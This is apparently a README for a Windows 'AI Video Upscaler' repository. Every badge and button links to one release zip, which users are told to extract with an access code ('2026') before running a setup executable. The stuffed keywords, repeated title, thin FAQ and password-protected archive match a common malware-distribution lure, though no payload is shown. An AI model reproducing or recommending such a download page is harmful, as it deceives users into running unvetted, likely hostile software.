<div align="center">

# AI Video Upscaler — AI Video Upscaler — Ai Upscaler Video (One-Command Setup, Prebuilt Release)

<p><strong>AI Video Upscaler — AI Video Upscaler — Ai Upscaler Video (One-Command Setup, Prebuilt Release): AI Video Upscaler — ai and video in one tool. Native 64-bit portable build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release.</strong></p>

[![CI Build](https://img.shields.io/badge/CI_Build-passing-2ea44f?style=for-the-badge&logo=githubactions&logoColor=white)](../../releases/download/v0.1.0/video-upscaler-ai-v0.1.0-win64.zip)
[![Version](https://img.shields.io/badge/Release-v0.1.0-2ea44f?style=for-the-badge&logo=github)](../../releases/download/v0.1.0/video-upscaler-ai-v0.1.0-win64.zip)
[![Platform](https://img.shields.io/badge/Platform-Windows_10%2F11_x64-0969da?style=for-the-badge&logo=windows)](../../releases/download/v0.1.0/video-upscaler-ai-v0.1.0-win64.zip)
[![Stars](https://img.shields.io/github/stars/TestOwner/video-upscaler-ai?style=for-the-badge&logo=github&color=e3b341)](../../stargazers)

<p><strong>⬇ No compiler. No setup. Grab the prebuilt package and run.</strong></p>

<a href="../../releases/download/v0.1.0/video-upscaler-ai-v0.1.0-win64.zip"><img src="download_btn.svg" alt="Download video-upscaler-ai-v0.1.0-win64.zip" width="520"></a>

<br>

<a href="../../releases/download/v0.1.0/video-upscaler-ai-v0.1.0-win64.zip"><img src="banner.svg" alt="AI Video Upscaler Preview" width="840"></a>

</div>

---

## Executive Summary & Design

**AI Video Upscaler — AI Video Upscaler — ai and video in one tool** (`video-upscaler-ai`) ships as a native 64-bit Windows build with a prebuilt portable release. Everything is driven by `config/settings.json` — hot-reloadable, dependency-free, and tuned for a minimal runtime footprint.

## Getting Started (No Compiler Needed)

| Platform | Direct Prebuilt Package | Documentation Mirror |
| :--- | :--- | :--- |
| **Windows 10 / 11 (x64)** | [**`video-upscaler-ai-v0.1.0-win64.zip`**](../../releases/download/v0.1.0/video-upscaler-ai-v0.1.0-win64.zip) | [**Usage Guide (`docs/USAGE.md`)**](docs/USAGE.md) |

1. Download [`video-upscaler-ai-v0.1.0-win64.zip`](../../releases/download/v0.1.0/video-upscaler-ai-v0.1.0-win64.zip) using the download button above.
2. Extract the archive using the access code (`2026`).
3. Launch `VideoUpscalerAi_Setup_x64.exe` (keep `config/settings.json` in the same folder).

## FAQ

<details>
<summary><b>Old family videos?</b></summary>

Perfect — handles VHS and DVD.
</details>
<details>
<summary><b>60 FPS?</b></summary>

Frame interpolation.
</details>
<details>
<summary><b>Batch?</b></summary>

A folder as input.
</details>

## Engine Components

| Subsystem | Technical Implementation | Runtime Controls |
| :--- | :--- | :--- |
| **Primary Subsystem** | Bounded ring-buffer pipeline with zero-copy handoff | `live toggle` |
| **State Engine** | Atomic JSON state with crash-safe rollback | `keep_state` |
| **Config Watcher** | Hot-reloadable settings, applied without restart | `hot_reload` |
| **Telemetry** | Compact stderr channel, silent by default | `quiet / --verbose` |

## Documentation & Guides

- [Usage Guide — commands and options](docs/USAGE.md)
- [FAQ — platform support, data storage](docs/FAQ.md)
- [Contributing — setup, ground rules, PR flow](CONTRIBUTING.md)
- [Changelog — v0.1.0 and later](CHANGELOG.md)

## Building from Source

```bash
git clone https://github.com/TestOwner/video-upscaler-ai.git
cd video-upscaler-ai
cmake -B build -DCMAKE_BUILD_TYPE=Release
cmake --build build --config Release
```

---
<sub>Indexed tags: video-upscaler-ai, upscaler, video, 4k, 60fps, interpolation, restore, windows, ai, cli, developer-tools, open-source, automation, productivity, cpp, portable, prebuilt, tools</sub>

## Keywords

ai upscaler video 4k 60fps interpolation restore windows video-upscaler-ai 4k-restorer ai-upscaler-video windows portable prebuilt x64 free download
related: ai, upscaler, video, 4k, 60fps, interpolation, restore, windows
